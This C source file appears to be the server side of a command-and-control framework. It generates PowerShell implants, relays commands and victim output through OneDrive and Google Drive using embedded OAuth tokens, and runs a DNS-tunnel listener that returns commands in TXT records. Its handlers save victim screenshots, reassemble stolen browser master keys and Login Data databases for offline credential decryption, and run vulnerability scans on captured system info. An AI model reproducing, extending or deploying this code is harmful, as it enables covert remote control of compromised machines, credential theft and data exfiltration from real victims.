#include "c2_core.h"

static Chunk chunks[MAX_CHUNKS];
static int have_start = 0;
static int total_bytes = -1;
static int expected_chunks = -1;
static int last_seq = 0;
extern int wes_pipeline_active;

int is_digits(const char *s) {
    if (!s || !*s) return 0;
    for (; *s; s++) { if (*s < '0' || *s > '9') return 0; }
    return 1;
}

int is_hex_str(const char *s) {
    if (!s || !*s) return 0;
    for (; *s; s++) {
        char c = *s;
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
            return 0;
    }
    return 1;
}

int decode_domain_name(const unsigned char *packet, int pkt_len, int offset, unsigned char *out, int out_len) {
    int out_i = 0, jumped = 0, orig_offset = offset, loops = 0;
    while (offset < pkt_len && loops < 50) {
        loops++;
        unsigned char len = packet[offset];
        if (len == 0) { if (!jumped) offset++; break; }
        if ((len & 0xC0) == 0xC0) {
            if (offset + 1 >= pkt_len) return -1;
            int ptr = ((len & 0x3F) << 8) | packet[offset + 1];
            if (ptr >= pkt_len) return -1;
            offset = ptr; jumped = 1; continue;
        }
        offset++;
        if (offset + len > pkt_len) return -1;
        if (out_i + len + 1 >= out_len) return -1;
        memcpy(out + out_i, packet + offset, len);
        out_i += len; out[out_i++] = '.'; offset += len;
    }
    if (out_i == 0) out[0] = '\0'; else out[out_i - 1] = '\0';
    return jumped ? orig_offset + 2 : offset;
}

unsigned char hex_to_byte(const char *hex) {
    unsigned char val = 0;
    for (int i = 0; i < 2; i++) {
        char c = hex[i]; val <<= 4;
        if (c >= '0' && c <= '9') val += c - '0';
        else if (c >= 'a' && c <= 'f') val += c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') val += c - 'A' + 10;
    }
    return val;
}

void reset_state(void) {
    memset(chunks, 0, sizeof(chunks));
    have_start = 0; total_bytes = -1; expected_chunks = -1; last_seq = 0;
}

void execute_offline_decryption(const char *db_path, const char *master_key_hex) {
    char python_cmd[1024];
    snprintf(python_cmd, sizeof(python_cmd), "python3 get-cred.py --db %s --key %s", db_path, master_key_hex);
    printf("[*] Pipeline Trigger: Running local math decryption layer ...\n");
    system(python_cmd);
}

void generate_onedrive_agent(void) {
    FILE *f_discovery = fopen("script_discovery.ps1", "r");
    FILE *f_template  = fopen("template_onedrive.ps1", "r");
    FILE *f_output     = fopen("generated_agent_onedrive.ps1", "w");

    if (!f_template || !f_output) {
        printf(COLOR_RED "[-] Error: Cannot access OneDrive template files.\n" COLOR_RESET);
        if (f_discovery) fclose(f_discovery);
        if (f_template) fclose(f_template);
        if (f_output) fclose(f_output);
        return;
    }
    char line[1024];

    if (f_discovery) {
        fprintf(f_output, "# --- Embedded Custom Operator Scripts ---\n");
        while (fgets(line, sizeof(line), f_discovery)) { fprintf(f_output, "%s", line); }
        fprintf(f_output, "\n# ----------------------------------------\n\n");
        fclose(f_discovery);
    }

    while (fgets(line, sizeof(line), f_template)) {
        if (strstr(line, "_ONEDRIVE_CLIENT_ID_PLACEHOLDER_")) {
            fprintf(f_output, "$ClientID     = \"%s\"\n", ONEDRIVE_CLIENT_ID);
        } else if (strstr(line, "_ONEDRIVE_CLIENT_SECRET_PLACEHOLDER_")) {
            fprintf(f_output, "$ClientSecret = \"%s\"\n", ONEDRIVE_CLIENT_SECRET);
        } else if (strstr(line, "_ONEDRIVE_REFRESH_TOKEN_PLACEHOLDER_")) {
            fprintf(f_output, "$RefreshToken = \"%s\"\n", ONEDRIVE_REFRESH_TOKEN);
        } else {
            fprintf(f_output, "%s", line);
        }
    }
    fclose(f_template); fclose(f_output);
    printf(COLOR_GREEN "[+] Success: 'generated_agent_onedrive.ps1' compiled successfully!\n" COLOR_RESET);
}

void generate_drive_agent(void) {
    FILE *f_discovery = fopen("script_discovery.ps1", "r");
    FILE *f_template  = fopen("template_drive.ps1", "r");
    FILE *f_output     = fopen("generated_agent.ps1", "w");

    if (!f_discovery || !f_template || !f_output) {
        printf(COLOR_RED "[-] Error: Cannot access template files.\n" COLOR_RESET);
        if (f_discovery) fclose(f_discovery);
        if (f_template) fclose(f_template);
        if (f_output) fclose(f_output);
        return;
    }
    char line[1024];

    if (f_discovery) {
        fprintf(f_output, "# --- Embedded Custom Operator Scripts ---\n");
        while (fgets(line, sizeof(line), f_discovery)) { fprintf(f_output, "%s", line); }
        fprintf(f_output, "\n# ----------------------------------------\n\n");
        fclose(f_discovery);
    }

    while (fgets(line, sizeof(line), f_template)) {
        if (strstr(line, "_CLIENT_ID_PLACEHOLDER_")) {
            fprintf(f_output, "$ClientID     = \"%s\"\n", GLOBAL_CLIENT_ID);
        } else if (strstr(line, "_CLIENT_SECRET_PLACEHOLDER_")) {
            fprintf(f_output, "$ClientSecret = \"%s\"\n", GLOBAL_CLIENT_SECRET);
        } else if (strstr(line, "_REFRESH_TOKEN_PLACEHOLDER_")) {
            fprintf(f_output, "$RefreshToken = \"%s\"\n", GLOBAL_REFRESH_TOKEN);
        } else if (strstr(line, "_CMD_FILE_ID_PLACEHOLDER_")) {
            fprintf(f_output, "$CmdFileID    = \"%s\"\n", GLOBAL_CMD_FILE_ID);
        } else if (strstr(line, "_RES_FILE_ID_PLACEHOLDER_")) {
            fprintf(f_output, "$ResFileID    = \"%s\"\n", GLOBAL_RES_FILE_ID);
        } else {
            fprintf(f_output, "%s", line);
        }
    }
    fclose(f_template); fclose(f_output);
    printf(COLOR_GREEN "[+] Success: 'generated_agent.ps1' (Drive Context) compiled successfully!\n" COLOR_RESET);
}

void generate_dns_agent(void) {
    FILE *f_discovery = fopen("script_discovery.ps1", "r");
    FILE *f_template = fopen("template_dns.ps1", "r");
    FILE *f_output   = fopen("generated_agent_dns.ps1", "w");

    if (!f_template || !f_output) {
        printf(COLOR_RED "[-] Error: Cannot access template_dns.ps1 file.\n" COLOR_RESET);
        if (f_discovery) fclose(f_discovery);
        if (f_template) fclose(f_template);
        if (f_output) fclose(f_output);
        return;
    }
    char line[1024];
    if (f_discovery) {
        fprintf(f_output, "# --- Embedded Custom Operator Scripts ---\n");
        while (fgets(line, sizeof(line), f_discovery)) { 
            fprintf(f_output, "%s", line); 
        }
        fprintf(f_output, "\n# ----------------------------------------\n\n");
        fclose(f_discovery);
    }
    while (fgets(line, sizeof(line), f_template)) {
        fprintf(f_output, "%s", line);
    }
    fclose(f_template); fclose(f_output);
    printf(COLOR_GREEN "[+] Success: 'generated_agent_dns.ps1' (DNS Context) compiled successfully!\n" COLOR_RESET);
}

void send_command_to_onedrive(const char *target_agent, const char *command_text) {
    char combined_cmd[2048];
    snprintf(combined_cmd, sizeof(combined_cmd), "[%s] %s", target_agent, command_text);

    char system_cmd[5120];
    snprintf(system_cmd, sizeof(system_cmd),
        "token=$(curl -s -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token "
        "-d 'client_id=%s' -d 'client_secret=%s' "
        "-d 'refresh_token=%s' -d 'grant_type=refresh_token' -d 'redirect_uri=http://localhost' "
        "| grep -o '\"access_token\":\"[^\"]*' | cut -d'\"' -f4); "
        "curl -s -X PUT \"https://graph.microsoft.com/v1.0/me/drive/root:/C2/cmd.txt:/content\" "
        "-H \"Authorization: Bearer $token\" -H \"Content-Type: text/plain\" "
        "-d '%s' > /dev/null 2>&1",
        ONEDRIVE_CLIENT_ID, ONEDRIVE_CLIENT_SECRET, ONEDRIVE_REFRESH_TOKEN, combined_cmd);
    system(system_cmd);
}

void* onedrive_listener_thread(void* arg) {
    char system_cmd[4096];
    while (onedrive_listener_running) {
        snprintf(system_cmd, sizeof(system_cmd),
            "token=$(curl -s -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token "
            "-d 'client_id=%s' -d 'client_secret=%s' "
            "-d 'refresh_token=%s' -d 'grant_type=refresh_token' -d 'redirect_uri=http://localhost' "
            "| tr -d ' ' | grep -o '\"access_token\":\"[^\"]*' | cut -d'\"' -f4); "
            "curl -sL -X GET \"https://graph.microsoft.com/v1.0/me/drive/root:/C2/res.txt:/content\" "
            "-H \"Authorization: Bearer $token\" 2>/dev/null",
            ONEDRIVE_CLIENT_ID, ONEDRIVE_CLIENT_SECRET, ONEDRIVE_REFRESH_TOKEN);

        FILE *fp = popen(system_cmd, "r");
        if (fp) {
            char response[500000] = {0}; // Increased buffer to 500KB for full screenshot capability
            int bytes_read = fread(response, 1, sizeof(response) - 1, fp);
            pclose(fp);

            if (bytes_read > 0 && strlen(response) > 0 && strstr(response, "\"error\"") == NULL) {
                char agent_name[50] = "Unknown_OneDrive_Agent";
                char *loot_content = response;

                if (response[0] == '[') {
                    char *end_bracket = strchr(response, ']');
                    if (end_bracket) {
                        int name_len = end_bracket - response - 1;
                        if (name_len < 50) {
                            strncpy(agent_name, response + 1, name_len);
                            agent_name[name_len] = '\0';
                            loot_content = end_bracket + 2;
                        }
                    }
                }

                add_or_update_session(agent_name, "OneDrive");
                //  SCREENSHOT LOGIC INTEGRATION 
                if (strstr(loot_content, "SCREENSHOT_DATA:") != NULL) {
                    char *base64_data = strstr(loot_content, "SCREENSHOT_DATA:") + 16;
                    printf("\n" COLOR_GREEN "[⚡] Global Alert: New Live Screenshot payload received from agent!" COLOR_RESET "\n");
                    printf("[*] Extracting data stream and initiating base64-to-jpeg hardware pipeline...\n");
                    FILE *fp_img = popen("base64 -d > victim_snap.jpg", "w");
                    if (fp_img) {
                        fprintf(fp_img, "%s", base64_data);
                        pclose(fp_img);
                        printf(COLOR_GREEN "[+] SUCCESS: Live JPEG image successfully reconstructed and saved to disk as 'victim_snap.jpg'!\n" COLOR_RESET);
                    } else {
                        printf(COLOR_RED "[-] System Error: Failed to spawn base64 local decoder.\n" COLOR_RESET);
                    }
                }         
                //  CREDENTIAL PIPELINE - NEW LOCAL DESIGN 
                if (strstr(loot_content, "---MASTER_KEY_HEX---") != NULL) {
                    printf("\n" COLOR_GREEN "[⚡] Global Alert: Browser artifacts received from agent!" COLOR_RESET "\n");

                
                    char *key_start = strstr(loot_content, "---MASTER_KEY_HEX---") + strlen("---MASTER_KEY_HEX---") + 1;
                    char *key_end = strstr(loot_content, "---MASTER_KEY_END---");
                    if (key_start && key_end) {
                        FILE *key_file = fopen("master_key.txt", "w");
                        if (key_file) {
                            fwrite(key_start, 1, key_end - key_start - 1, key_file);
                            fclose(key_file);
                            printf("[*] Master key hex saved to master_key.txt\n");
                        }
                    }

                    char *db_start = strstr(loot_content, "---LOGIN_DATA_START---") + strlen("---LOGIN_DATA_START---") + 1;
                    char *db_end = strstr(loot_content, "---LOGIN_DATA_END---");
                    if (db_start && db_end) {
                        FILE *b64_file = fopen("login_data.b64", "w");
                        if (b64_file) {
                            fwrite(db_start, 1, db_end - db_start - 1, b64_file);
                            fclose(b64_file);
                        }
                        
                        system("base64 -d login_data.b64 > extracted_login_data.db 2>/dev/null");
                        system("rm -f login_data.b64");
                        printf("[*] Database binary reconstructed as extracted_login_data.db\n");
                    }

                    
                    printf("[*] Executing offline decryption pipeline via Python...\n\n");
                    system("python3 decrypt_credentials.py");
                }
                else if (wes_pipeline_active && (strstr(loot_content, "Host Name:") != NULL || strstr(loot_content, "OS Name:") != NULL)) {
                    printf("\n" COLOR_GREEN "==================== [ AUTOMATED PIPELINE: WES-NG ANALYSIS ] ====================\n" COLOR_RESET);
                    printf(COLOR_YELLOW "[*] System baseline captured via OneDrive. Analyzing vulnerabilities...\n\n" COLOR_RESET);
                    FILE *f_wes = fopen("received_file.txt", "w");
                    if (f_wes) { fprintf(f_wes, "%s", loot_content); fclose(f_wes); }
                    FILE *fp_wes = popen("python3 wes.py received_file.txt -e", "r");
                    if (fp_wes) {
                        char wes_line[256];
                        while (fgets(wes_line, sizeof(wes_line), fp_wes) != NULL) {
                            if (strstr(wes_line, "CVE-") != NULL) printf(COLOR_RED "%s" COLOR_RESET, wes_line); 
                            else printf("%s", wes_line);
                        }
                        pclose(fp_wes);
                    }
                    printf("\n" COLOR_GREEN "================================================================================\n\n" COLOR_RESET);
                    wes_pipeline_active = 0; 
                } 
                else {
                    printf("\n" COLOR_GREEN "==================== [ LOOT FROM ONEDRIVE: %s ] ====================\n" COLOR_RESET, agent_name);
                    printf("%s\n", loot_content);
                    printf(COLOR_GREEN "======================================================================\n\n" COLOR_RESET);
                }

                snprintf(system_cmd, sizeof(system_cmd),
                    "token=$(curl -s -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token "
                    "-d 'client_id=%s' -d 'client_secret=%s' "
                    "-d 'refresh_token=%s' -d 'grant_type=refresh_token' -d 'redirect_uri=http://localhost' "
                    "| tr -d ' ' | grep -o '\"access_token\":\"[^\"]*' | cut -d'\"' -f4); "
                    "curl -s -X PUT \"https://graph.microsoft.com/v1.0/me/drive/root:/C2/res.txt:/content\" "
                    "-H \"Authorization: Bearer $token\" -H \"Content-Type: text/plain\" -d \"\" > /dev/null 2>&1",
                    ONEDRIVE_CLIENT_ID, ONEDRIVE_CLIENT_SECRET, ONEDRIVE_REFRESH_TOKEN);
                system(system_cmd);

                if (current_interact_id != -1) printf(COLOR_RED "c2-session(%s) " COLOR_RESET "> ", sessions[current_interact_id - 1].name);
                else printf(COLOR_BLUE "c2-server(%s) " COLOR_RESET "> ", selected_channel);
                fflush(stdout);
            }
        }
        sleep(5);
    }
    return NULL;
}

void send_command_to_drive(const char *target_agent, const char *command_text) {
    char combined_cmd[2048];
    snprintf(combined_cmd, sizeof(combined_cmd), "[%s] %s", target_agent, command_text);

    char system_cmd[5120];
    snprintf(system_cmd, sizeof(system_cmd),
        "token=$(curl -s -X POST https://oauth2.googleapis.com/token "
        "-d 'client_id=%s' -d 'client_secret=%s' "
        "-d 'refresh_token=%s' -d 'grant_type=refresh_token' "
        "| grep -o '\"access_token\": \"[^\"]*' | cut -d'\"' -f4); "
        "curl -s -X PATCH \"https://www.googleapis.com/upload/drive/v3/files/%s?uploadType=media\" "
        "-H \"Authorization: Bearer $token\" "
        "-H \"Content-Type: text/plain\" "
        "-d '%s' > /dev/null 2>&1",
        GLOBAL_CLIENT_ID, GLOBAL_CLIENT_SECRET, GLOBAL_REFRESH_TOKEN, GLOBAL_CMD_FILE_ID, combined_cmd);
    system(system_cmd);
}

void* drive_listener_thread(void* arg) {
    char system_cmd[4096];
    while (drive_listener_running) {
        snprintf(system_cmd, sizeof(system_cmd),
            "token=$(curl -s -X POST https://oauth2.googleapis.com/token "
            "-d \"client_id=%s\" -d \"client_secret=%s\" "
            "-d \"refresh_token=%s\" -d \"grant_type=refresh_token\" "
            "| grep -o '\"access_token\": \"[^\"]*' | cut -d'\"' -f4); "
            "curl -s -X GET \"https://www.googleapis.com/drive/v3/files/%s?alt=media\" "
            "-H \"Authorization: Bearer $token\" 2>/dev/null",
            GLOBAL_CLIENT_ID, GLOBAL_CLIENT_SECRET, GLOBAL_REFRESH_TOKEN, GLOBAL_RES_FILE_ID);

        FILE *fp = popen(system_cmd, "r");
        if (fp) {
            char response[500000] = {0}; // Increased buffer to 500KB for full screenshot capability
            int bytes_read = fread(response, 1, sizeof(response) - 1, fp);
            pclose(fp);

            if (bytes_read > 0) {
                response[bytes_read] = '\0';
                if (strlen(response) > 0 && strstr(response, "\"error\"") == NULL) {
                    char agent_name[50] = "Unknown_Agent";
                    char *loot_content = response;
                    
                    if (response[0] == '[') {
                        char *end_bracket = strchr(response, ']');
                        if (end_bracket) {
                            int name_len = end_bracket - response - 1;
                            if (name_len < 50) {
                                strncpy(agent_name, response + 1, name_len);
                                agent_name[name_len] = '\0';
                                loot_content = end_bracket + 2; 
                            }
                        }
                    }

                    add_or_update_session(agent_name, "Google Drive");

                    //  SCREENSHOT LOGIC INTEGRATION 
                    if (strstr(loot_content, "SCREENSHOT_DATA:") != NULL) {
                        char *base64_data = strstr(loot_content, "SCREENSHOT_DATA:") + 16;
                        printf("\n" COLOR_GREEN "[⚡] Global Alert: New Live Screenshot payload received from agent!" COLOR_RESET "\n");
                        printf("[*] Extracting data stream and initiating base64-to-jpeg hardware pipeline...\n");
                        FILE *fp_img = popen("base64 -d > victim_snap.jpg", "w");
                        if (fp_img) {
                            fprintf(fp_img, "%s", base64_data);
                            pclose(fp_img);
                            printf(COLOR_GREEN "[+] SUCCESS: Live JPEG image successfully reconstructed and saved to disk as 'victim_snap.jpg'!\n" COLOR_RESET);
                        } else {
                            printf(COLOR_RED "[-] System Error: Failed to spawn base64 local decoder.\n" COLOR_RESET);
                        }
                    }

                    //  CREDENTIAL PIPELINE - NEW LOCAL DESIGN 
                    else if (strstr(loot_content, "---MASTER_KEY_HEX---") != NULL) {
                        printf("\n" COLOR_GREEN "[⚡] Global Alert: Browser artifacts received from agent!" COLOR_RESET "\n");

                        // 1. חילוץ ושמירת ה-Master Key לקובץ זמני
                        char *key_start = strstr(loot_content, "---MASTER_KEY_HEX---") + strlen("---MASTER_KEY_HEX---") + 1;
                        char *key_end = strstr(loot_content, "---MASTER_KEY_END---");
                        if (key_start && key_end) {
                            FILE *key_file = fopen("master_key.txt", "w");
                            if (key_file) {
                                fwrite(key_start, 1, key_end - key_start - 1, key_file);
                                fclose(key_file);
                                printf("[*] Master key hex saved to master_key.txt\n");
                            }
                        }

                       
                        char *db_start = strstr(loot_content, "---LOGIN_DATA_START---") + strlen("---LOGIN_DATA_START---") + 1;
                        char *db_end = strstr(loot_content, "---LOGIN_DATA_END---");
                        if (db_start && db_end) {
                            
                            FILE *b64_file = fopen("login_data.b64", "w");
                            if (b64_file) {
                                fwrite(db_start, 1, db_end - db_start - 1, b64_file);
                                fclose(b64_file);
                            }
                            
                        
                            system("base64 -d login_data.b64 > extracted_login_data.db 2>/dev/null");
                            system("rm -f login_data.b64");
                            printf("[*] Database binary reconstructed as extracted_login_data.db\n");
                        }

                        printf("[*] Executing offline decryption pipeline via Python...\n\n");
                        system("python3 decrypt_credentials.py");
                    }
                    else if ((strstr(loot_content, "Host Name:") != NULL || strstr(loot_content, "OS Name:") != NULL || strstr(loot_content, "INSTALLED") != NULL) && wes_pipeline_active) {
                        FILE *f_wes = fopen("agent_sysinfo.txt", "w");
                        if (f_wes) { fprintf(f_wes, "%s", loot_content); fclose(f_wes); }
                        FILE *fp_wes = popen("python3 wes.py agent_sysinfo.txt -e", "r");
                        if (fp_wes) {
                            char wes_line[256];
                            while (fgets(wes_line, sizeof(wes_line), fp_wes) != NULL) {
                                if (strstr(wes_line, "CVE-") != NULL) printf(COLOR_RED "%s" COLOR_RESET, wes_line); 
                                else printf("%s", wes_line);
                            }
                            pclose(fp_wes);
                        }
                        wes_pipeline_active = 0;
                    }
                    else {
                        printf("\n" COLOR_GREEN "==================== [ LOOT FROM TARGET: %s ] ====================\n" COLOR_RESET, agent_name);
                        printf("%s\n", loot_content);
                        printf(COLOR_GREEN "======================================================================\n\n" COLOR_RESET);
                    }

                    // Clear the file in the drive
                    snprintf(system_cmd, sizeof(system_cmd),
                        "token=$(curl -s -X POST https://oauth2.googleapis.com/token "
                        "-d \"client_id=%s\" -d \"client_secret=%s\" "
                        "-d \"refresh_token=%s\" -d \"grant_type=refresh_token\" "
                        "| grep -o '\"access_token\": \"[^\"]*' | cut -d'\"' -f4); "
                        "curl -s -X PATCH \"https://www.googleapis.com/upload/drive/v3/files/%s?uploadType=media\" "
                        "-H \"Authorization: Bearer $token\" "
                        "-H \"Content-Type: text/plain\" -d \"\" > /dev/null 2>&1",
                        GLOBAL_CLIENT_ID, GLOBAL_CLIENT_SECRET, GLOBAL_REFRESH_TOKEN, GLOBAL_RES_FILE_ID);
                    system(system_cmd);

                    printf(COLOR_RESET "\n");
                    if (current_interact_id != -1) printf(COLOR_RED "c2-session(%s) " COLOR_RESET "> ", sessions[current_interact_id - 1].name);
                    else printf(COLOR_BLUE "c2-server(%s) " COLOR_RESET "> ", selected_channel);
                    fflush(stdout); 
                }
            }
        }
        sleep(5);
    }
    return NULL;
}

void* dns_listener_thread(void* arg) {
    unsigned char buffer[BUF_SIZE];
    struct sockaddr_in server, client;
    socklen_t client_len = sizeof(client);

    dns_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (dns_sockfd < 0) return NULL;

    int opt = 1;
    setsockopt(dns_sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(53);

    if (bind(dns_sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(dns_sockfd); return NULL;
    }

    reset_state();
    printf(COLOR_GREEN "[+] DNS Tunnel Listener active on UDP Port 53...\n" COLOR_RESET);

    while (dns_listener_running) {
        int n = recvfrom(dns_sockfd, buffer, BUF_SIZE, 0, (struct sockaddr*)&client, &client_len);
        if (n < 0) continue;

        unsigned char domain[512];
        int qname_off = 12;
        int new_off = decode_domain_name(buffer, n, qname_off, domain, sizeof(domain));
        if (new_off < 0) continue;

        char dom_copy[512];
        strncpy(dom_copy, (char*)domain, sizeof(dom_copy) - 1);
        dom_copy[sizeof(dom_copy) - 1] = '\0';

        char *labels[10]; int label_count = 0;
        char *tok = strtok(dom_copy, ".");
        while (tok && label_count < 10) { labels[label_count++] = tok; tok = strtok(NULL, "."); }

        if (label_count >= 3) {
            char type = labels[0][0];
            add_or_update_session("DNS_Agent_Remote", "DNS Tunnel");

            if (type == 's') {
                const char *size_str = labels[0] + 1;
                if (is_digits(size_str) && labels[1][0] == 'i' && strcmp(labels[2], "e0") == 0) {
                    reset_state();
                    total_bytes = atoi(size_str);
                    expected_chunks = (total_bytes + CHUNK_BYTES - 1) / CHUNK_BYTES;
                    have_start = 1;
                }
            }
            else if (type == 'd') {
                const char *hex = labels[0] + 1;
                if (is_hex_str(hex) && (strlen(hex) % 2) == 0) {
                    int seq = atoi(labels[1] + 1);
                    int endflag = atoi(labels[2] + 1);

                    if (seq > 0 && seq < MAX_CHUNKS && !chunks[seq].seen) {
                        int byte_len = strlen(hex) / 2;
                        chunks[seq].seen = 1; chunks[seq].len = byte_len;
                        for (int i = 0; i < byte_len; i++) chunks[seq].data[i] = hex_to_byte(hex + 2*i);

                        if (endflag == 1 && seq > last_seq) last_seq = seq;

                        int complete = 1;
                        int final_chunks = (expected_chunks > 0) ? expected_chunks : last_seq;
                        for (int i = 1; i <= final_chunks; i++) {
                            if (!chunks[i].seen) { complete = 0; break; }
                        }

                        if (complete && final_chunks > 0) {
                            // Reconstruct and build the full file from Chunks received via DNS
                            FILE *out = fopen("received_file.txt", "wb");
                            if (out) {
                                for (int i = 1; i <= final_chunks; i++) fwrite(chunks[i].data, 1, chunks[i].len, out);
                                fclose(out);
                            }
                            
                            // Check if the received data is system output for WES-NG
                            FILE *read_loot = fopen("received_file.txt", "r");
                            int is_sysinfo = 0;
                            if (read_loot) {
                                char test_buf[512];
                                while (fgets(test_buf, sizeof(test_buf), read_loot)) {
                                    if (strstr(test_buf, "Host Name:") != NULL || strstr(test_buf, "OS Name:") != NULL) {
                                        is_sysinfo = 1;
                                        break;
                                    }
                                }
                                fclose(read_loot);
                            }

                            //  Automated Pipeline Condition 
                            if (is_sysinfo && wes_pipeline_active) {
                                printf("\n" COLOR_GREEN "==================== [ AUTOMATED PIPELINE: WES-NG ANALYSIS ] ====================\n" COLOR_RESET);
                                printf(COLOR_YELLOW "[*] System baseline captured via DNS Tunnel. Analyzing vulnerabilities...\n\n" COLOR_RESET);
                                
                                // Execute analysis engine directly on the reconstructed file quietly from DNS
                                FILE *fp_wes = popen("python3 wes.py received_file.txt -e", "r");
                                if (fp_wes) {
                                    char wes_line[256];
                                    while (fgets(wes_line, sizeof(wes_line), fp_wes) != NULL) {
                                        if (strstr(wes_line, "CVE-") != NULL) {
                                            printf(COLOR_RED "%s" COLOR_RESET, wes_line); 
                                        } else {
                                            printf("%s", wes_line);
                                        }
                                    }
                                    pclose(fp_wes);
                                }
                                printf("\n" COLOR_GREEN "================================================================================\n\n" COLOR_RESET);
                                wes_pipeline_active = 0;
                            } 
                            else {
                                // If it is standard output from one of the scripts (like process list or files) - print it normally as loot
                                printf("\n" COLOR_GREEN "==================== [ LOOT FROM TARGET: DNS_Agent_Remote ] ====================\n" COLOR_RESET);
                                read_loot = fopen("received_file.txt", "r");
                                char file_buffer[1024];
                                if (read_loot) {
                                    while (fgets(file_buffer, sizeof(file_buffer), read_loot)) {
                                        printf("%s", file_buffer);
                                    }
                                    fclose(read_loot);
                                }
                                printf("\n" COLOR_GREEN "================================================================================\n\n" COLOR_RESET);
                            }

                            reset_state();
                            
                            // print prompt again after processing complete file
                            printf(COLOR_RESET "\n");
                            if (current_interact_id != -1) printf(COLOR_RED "c2-session(%s) " COLOR_RESET "> ", sessions[current_interact_id - 1].name);
                            else printf(COLOR_BLUE "c2-server(%s) " COLOR_RESET "> ", selected_channel);
                            fflush(stdout);
                        }
                    }
                }
            }
        }

        // ============================================================================
        // TXT DNS CHANNEL
        // ============================================================================
        unsigned char response[BUF_SIZE];
        memset(response, 0, BUF_SIZE); memcpy(response, buffer, n);
        
        response[2] = 0x81; response[3] = 0x80; // Flags: Standard Query Response
        response[6] = 0x00; response[7] = 0x01; // Answer Count = 1

        int ans_offset = n;
        response[ans_offset++] = 0xC0; response[ans_offset++] = 0x0C; // Name Pointer

        
        unsigned short resp_type = (strlen(dns_command_buffer) > 0) ? 16 : 1;
        response[ans_offset++] = (resp_type >> 8) & 0xFF; response[ans_offset++] = resp_type & 0xFF;
        response[ans_offset++] = 0x00; response[ans_offset++] = 0x01; // Class: IN

        unsigned int ttl = 60;
        response[ans_offset++] = (ttl >> 24) & 0xFF; response[ans_offset++] = (ttl >> 16) & 0xFF;
        response[ans_offset++] = (ttl >> 8) & 0xFF; response[ans_offset++] = ttl & 0xFF;

        if (resp_type == 16) {
            int cmd_len = strlen(dns_command_buffer);
            if (cmd_len > 254) cmd_len = 254; 

            unsigned short data_len = cmd_len + 1;
            response[ans_offset++] = (data_len >> 8) & 0xFF; response[ans_offset++] = data_len & 0xFF;
            response[ans_offset++] = cmd_len; 

            memcpy(response + ans_offset, dns_command_buffer, cmd_len);
            ans_offset += cmd_len;
            memset(dns_command_buffer, 0, sizeof(dns_command_buffer));
        } 
        else {
            response[ans_offset++] = 0x00; response[ans_offset++] = 0x04; // Data Length 4 Bytes
            unsigned int fake_ip = inet_addr("1.2.3.4");
            memcpy(response + ans_offset, &fake_ip, 4); ans_offset += 4;
        }

        sendto(dns_sockfd, response, ans_offset, 0, (struct sockaddr*)&client, client_len);
    }
    close(dns_sockfd);
    return NULL;
}
